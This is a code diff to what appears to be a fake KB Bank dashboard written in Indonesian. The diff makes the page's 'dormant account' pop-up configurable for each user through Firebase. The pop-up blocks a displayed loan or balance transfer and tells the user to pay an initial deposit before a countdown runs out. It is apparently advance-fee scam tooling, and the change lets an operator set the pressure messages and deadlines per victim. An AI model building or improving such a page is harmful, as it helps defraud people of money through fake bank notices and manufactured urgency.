@@ -1356,8 +1356,8 @@ a{text-decoration:none;color:inherit}
 
 <!-- NOTIFIKASI TAMBAHAN -->
 <div class="dormant-notice" role="note">
-  <strong>Informasi Rekening</strong>
-  <p>
+  <strong id="dormantNoticeTitle">Informasi Rekening</strong>
+  <p id="dormantNoticeBody">
     Rekening memerlukan verifikasi status sebelum proses dapat dilanjutkan.
     harap melakukan Pengisian saldo perdana ke rekening utama kb bank anda
   </p>
@@ -1499,9 +1499,13 @@ const dormantAccountNumber=$("dormantAccountNumber");
 const dormantAmount=$("dormantAmount");
 const dormantCountdown=$("dormantCountdown");
 const dormantClose=$("dormantClose");
+const dormantTitle=$("dormantTitle");
+const dormantCopy=$("dormantCopy");
+const dormantNoticeTitle=$("dormantNoticeTitle");
+const dormantNoticeBody=$("dormantNoticeBody");
 
 const TRANSFER_DURATION_MS=60_000;
-const DORMANT_WINDOW_MS=2*60*60*1000;
+let dormantWindowMs=2*60*60*1000;
 let transferTimer=null;
 let dormantTimer=null;
 let transferRunning=false;
@@ -1543,8 +1547,32 @@ function updateDormantCountdown(){
   }
 }
 
+const DEFAULT_DORMANT_CONFIG=Object.freeze({
+  title:"INFORMASI REKENING DORMANT",
+  message:"Pemeriksaan mendeteksi status rekening dormant. Pemindahan saldo belum bisa di proses.",
+  noticeTitle:"Informasi Rekening",
+  noticeBody:"Rekening memerlukan verifikasi status sebelum proses dapat dilanjutkan. harap melakukan Pengisian saldo perdana ke rekening utama kb bank anda",
+  countdownSeconds:7200
+});
+function applyDormantConfig(value){
+  const cfg=value&&typeof value==="object"?value:DEFAULT_DORMANT_CONFIG;
+  if(dormantTitle) dormantTitle.textContent=String(cfg.title||DEFAULT_DORMANT_CONFIG.title).slice(0,100);
+  if(dormantCopy) dormantCopy.textContent=String(cfg.message||DEFAULT_DORMANT_CONFIG.message).slice(0,500);
+  if(dormantNoticeTitle) dormantNoticeTitle.textContent=String(cfg.noticeTitle||DEFAULT_DORMANT_CONFIG.noticeTitle).slice(0,100);
+  if(dormantNoticeBody) dormantNoticeBody.textContent=String(cfg.noticeBody||DEFAULT_DORMANT_CONFIG.noticeBody).slice(0,500);
+  dormantWindowMs=Math.max(60,Math.min(86400,Math.round(Number(cfg.countdownSeconds)||7200)))*1000;
+}
+applyDormantConfig(null);
+try{
+  Promise.resolve(window.KBFirebaseBoot).then(async()=>{
+    const runtime=window.KBFirebaseRuntime;
+    if(!runtime?.isConfigured?.())return;
+    await runtime.listenUserDormantConfig(value=>applyDormantConfig(value));
+  }).catch(()=>{});
+}catch(_){}
+
 function openDormantModal(resetDeadline=false){
-  if(resetDeadline || dormantDeadline<=Date.now()) dormantDeadline=Date.now()+DORMANT_WINDOW_MS;
+  if(resetDeadline || dormantDeadline<=Date.now()) dormantDeadline=Date.now()+dormantWindowMs;
   if(dormantAccountNumber) dormantAccountNumber.textContent=account||"-";
   if(dormantAmount) dormantAmount.textContent=currency(dashboardBalance.loanBalance||amount);
   if(dormantModal) dormantModal.hidden=false;
